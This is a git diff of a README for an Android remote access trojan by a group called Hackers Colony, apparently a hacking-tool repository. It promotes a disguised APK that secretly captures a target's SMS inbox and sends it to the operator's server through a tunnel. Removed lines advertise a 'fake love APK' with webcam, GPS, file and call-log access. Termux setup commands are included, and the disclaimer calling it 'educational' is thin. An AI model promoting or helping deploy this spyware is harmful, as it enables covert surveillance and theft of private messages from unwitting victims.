@@ -1,67 +1,97 @@
+<h1 align="center">💀 HCO-SMS-RAT 💀</h1>
+
 <p align="center">
-  <img src="logo.png" alt="HCO-LOVE-RAT" width="250"/>
+  <b>A Termux-based SMS Logger RAT</b><br>
+  <b>by Hackers Colony</b>
 </p>
 
-<h1 align="center">💘 HCO-LOVE-RAT</h1>
 <p align="center">
-  A fully working Android Remote Access Tool (RAT) made for educational use.<br>
-  <strong>Generate a fake love APK</strong> with webcam, location, SMS, file access, and more — via Termux.<br><br>
-  <img src="https://img.shields.io/badge/Platform-Termux-green?style=for-the-badge"/>
-  <img src="https://img.shields.io/badge/Language-Python-blue?style=for-the-badge"/>
-  <img src="https://img.shields.io/badge/Tool%20by-Hackers%20Colony-red?style=for-the-badge"/>
+  <img src="https://img.shields.io/badge/Youtube-Subscribe-red?style=flat-square&logo=youtube">
+  <img src="https://img.shields.io/badge/Telegram-Join-blue?style=flat-square&logo=telegram">
+  <img src="https://img.shields.io/badge/Instagram-Follow-pink?style=flat-square&logo=instagram">
+  <img src="https://img.shields.io/badge/Discord-Chat-7289DA?style=flat-square&logo=discord">
 </p>
 
 ---
 
-### 🚀 Features
-- Auto webcam access (front/back)
-- GPS Location tracking
-- File browser + uploader
-- SMS and call log access
-- Custom payload with fake icon/name
-- Direct cloudflared tunneling
+## 🧠 What is HCO-SMS-RAT?
+
+**HCO-SMS-RAT** is a powerful browser-based SMS logger built in Python and Flask, designed for **educational and testing purposes** only.
+
+It captures SMS inbox logs from the target device through a disguised APK payload and sends it to your local Termux Flask server via webhook.
 
 ---
 
-### ⚙️ Setup in Termux
+## 📸 Preview
 
-```bash
-pkg update -y && pkg upgrade -y
-pkg install python git -y
-pip install flask requests
-pkg install cloudflared -y
-git clone https://github.com/Hackerscolonyofficial/HCO-SMS-RAT.git
-cd HCO-LOVE-RAT
-bash start.sh
+```
+╔══════════════════════════════╗
+║       HCO SMS RAT            ║
+╚══════════════════════════════╝
 ```
 
 ---
 
-### ⚠️ YouTube Redirect
-This tool is **not free**. You must subscribe to our channel to use it.
+## 🚀 Features
 
-> The tool redirects you to [Hackers Colony Tech](https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya) for 8 seconds. After that, press `Enter` to continue and generate your APK.
-
----
-
-### 🛡️ Disclaimer
-
-> This tool is for **educational and research purposes only**. Misuse of this tool is not the responsibility of the developer.
-
----
-
-### 👨‍💻 Author
-- **Code by Azhar**
-- [Instagram](https://www.instagram.com/hackers_colony_official)
-- [Telegram](https://t.me/hackersColony)
-- [Discord](https://discord.gg/Xpq9nCGD)
-- [Facebook](https://www.facebook.com/share/1AY25it2Em/)
-- [Website](https://hackerscolonyofficial.blogspot.com/?m=1)
+- Auto YouTube subscription redirect
+- Flask server auto-start
+- Cloudflare tunnel auto-start
+- Real-time SMS inbox capture
+- Terminal logs live
+- Secure webhook integration
+- Root access not required on target
 
 ---
 
-### 🧠 Hacker Quote
+## 🧰 Setup Commands (Termux)
 
-> **"In a world full of firewalls, be the zero-day."**
+```bash
+pkg update -y && pkg upgrade -y
+pkg install python git wget -y
+pip install flask cloudflared
+
+git clone https://github.com/yourname/HCO-SMS-RAT
+cd HCO-SMS-RAT
+
+chmod +x start.sh
+bash start.sh
+```
+
+> ✅ When it asks: **"Press Enter after subscribing..."**, go back to Termux and press `Enter`.
 
 ---
+
+## 📂 Project Structure
+
+```
+📦 HCO-SMS-RAT/
+├── start.sh
+├── main.py
+├── webhook.py
+├── index.html
+├── requirements.txt
+├── love.txt
+├── LICENSE
+└── README.md
+```
+
+---
+
+## ⚠️ Disclaimer
+
+> **This tool is for educational and research purposes only.**
+>
+> The creators are not responsible for any misuse or illegal activity done with this tool.  
+> You must have proper authorization before testing it on any device.
+
+---
+
+## ✨ Code by Azhar
+
+> © Hackers Colony  
+> Connect on [Instagram](https://www.instagram.com/hackers_colony_official) | [Telegram](https://t.me/hackersColony) | [YouTube](https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya)
+
+---
+
+> 💬 _"Hackers don't destroy. They rebuild. We bend the system to understand it."_
